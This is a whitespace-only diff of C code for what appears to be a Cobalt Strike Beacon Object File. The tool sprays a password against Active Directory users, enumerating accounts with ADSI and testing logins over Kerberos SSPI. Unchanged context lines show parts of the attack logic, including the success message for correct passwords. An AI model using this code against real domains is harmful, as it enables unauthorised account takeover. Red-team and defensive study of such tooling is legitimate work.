@@ -1,4 +1,4 @@
-#define SECURITY_WIN32 
+#define SECURITY_WIN32
 
 #include <windows.h>
 #include <activeds.h>
@@ -65,7 +65,7 @@ VOID BeaconOutputStreamW() {
 			goto CleanUp;
 		}
 
-		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
+		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {
 			goto CleanUp;
 		}
 
@@ -89,7 +89,7 @@ CleanUp:
 void GetFormattedErrMsg(_In_ HRESULT hr) {
     LPWSTR lpwErrorMsg = NULL;
 
-    KERNEL32$FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,  
+    KERNEL32$FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,
 	NULL,
 	(DWORD)hr,
 	MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
@@ -168,12 +168,12 @@ BOOL LogonUserSSPI(_In_ LPWSTR pszSSP, _In_ LPWSTR pszAuthority, _In_ LPWSTR psz
 	if (pBufC2S == NULL) {
 		goto CleanUp;
 	}
-	
+
 	pBufS2C = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAXTOKENSIZE);
 	if (pBufS2C == NULL) {
 		goto CleanUp;
 	}
-	
+
 	SecBuffer sbufC2S = { MAXTOKENSIZE, SECBUFFER_TOKEN, pBufC2S };
 	SecBuffer sbufS2C = { MAXTOKENSIZE, SECBUFFER_TOKEN, pBufS2C };
 	SecBufferDesc bdC2S = { SECBUFFER_VERSION, 1, &sbufC2S };
@@ -369,7 +369,7 @@ HRESULT SprayUsers(_In_ IDirectorySearch *pContainerToSearch, _In_ LPCWSTR lpwSp
 		}
 	}
 
-	if (SUCCEEDED(hr)) {	
+	if (SUCCEEDED(hr)) {
 		// Call IDirectorySearch::GetNextRow() to retrieve the next row of data.
 		hr = pContainerToSearch->lpVtbl->GetFirstRow(pContainerToSearch, hSearch);
 		if (SUCCEEDED(hr)) {
@@ -400,20 +400,20 @@ HRESULT SprayUsers(_In_ IDirectorySearch *pContainerToSearch, _In_ LPCWSTR lpwSp
 										}
 										if (SUCCEEDED(hr)) {
 											BeaconPrintf(CALLBACK_OUTPUT, "[+] Password correct for useraccount: %ls\n", col.pADsValues->CaseIgnoreString);
-											MSVCRT$wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);											
+											MSVCRT$wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);
 
 											dwAccountsSuccess = dwAccountsSuccess + 1;
 											dwAccountsTested = dwAccountsTested + 1;
-										}								
+										}
 										if (pRoot){
 											pRoot->lpVtbl->Release(pRoot);
 											pRoot = NULL;
 										}
 									}
 									else{
-										BOOL bResult = LogonUserSSPI(L"Kerberos", 
-											pdcInfo->DomainName, 
-											col.pADsValues->CaseIgnoreString, 
+										BOOL bResult = LogonUserSSPI(L"Kerberos",
+											pdcInfo->DomainName,
+											col.pADsValues->CaseIgnoreString,
 											(LPWSTR)lpwSprayPasswd);
 
 										if (!bResult) {
@@ -422,7 +422,7 @@ HRESULT SprayUsers(_In_ IDirectorySearch *pContainerToSearch, _In_ LPCWSTR lpwSp
 										}
 										if (bResult) {
 											BeaconPrintf(CALLBACK_OUTPUT, "[+] Password correct for useraccount: %ls\n", col.pADsValues->CaseIgnoreString);
-											MSVCRT$wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);											
+											MSVCRT$wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);
 
 											dwAccountsSuccess = dwAccountsSuccess + 1;
 											dwAccountsTested = dwAccountsTested + 1;
@@ -494,7 +494,7 @@ CleanUp:
 
 	//Print final Output
 	BeaconOutputStreamW();
-	
+
 	if (pUserInfo != NULL) {
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pUserInfo);
 	}
@@ -604,7 +604,7 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 	// Parse Arguments
 	datap parser;
 	BeaconDataParse(&parser, Args, Length);
-	
+
 	lpwSprayPasswd = (WCHAR*)BeaconDataExtract(&parser, NULL);
 	if (lpwSprayPasswd == NULL) {
 		BeaconPrintf(CALLBACK_ERROR, "No password specified!\n");
